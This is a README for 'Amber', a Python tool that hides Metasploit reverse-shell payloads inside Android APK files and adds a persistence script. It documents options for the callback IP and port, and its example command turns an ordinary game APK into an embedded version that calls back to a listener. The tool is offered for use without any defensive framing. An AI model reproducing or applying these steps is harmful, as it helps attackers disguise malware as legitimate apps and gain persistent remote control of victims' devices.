# Amber

Amber is a Python library used for making embedded android payloads capable of a persistence shell.To be used with Metasploit

## Usage
Usage: python amber [options] [options]

  Options:
  
  -l [ipadr], --LHOST [ipadr]: Set the lhost ipaddress of the payload
  
  -p [port],  --LPORT [port] : Set the port which the payload communicates to
  
  -i [file_location], --input [file_location] : The input file location
  
  -o [destination_location], --output [destination_location] : The output file name and location,defaults to
                                                               the program directory saved as output.apk
                                                               
  -s [destination_location], --script_out [destination_location] : The location of the persistence script to be saved to,defaults to program
                                                                   directory saved as script.sh Note! this should end in '.sh' with filename
                                                                   
  -h, --help : Displays this help dialogue

## Example
python amber.py --LHOST 192.168.43.2 --LPORT 8888 --input game.apk --output embedded_game.apk --script_out "~/Desktop/script.sh" 


## Contributing
Pull requests are welcome. For major changes, please open an issue first to discuss what you would like to change.

Please make sure to update tests as appropriate.

## License
[MIT](https://choosealicense.com/licenses/mit/)
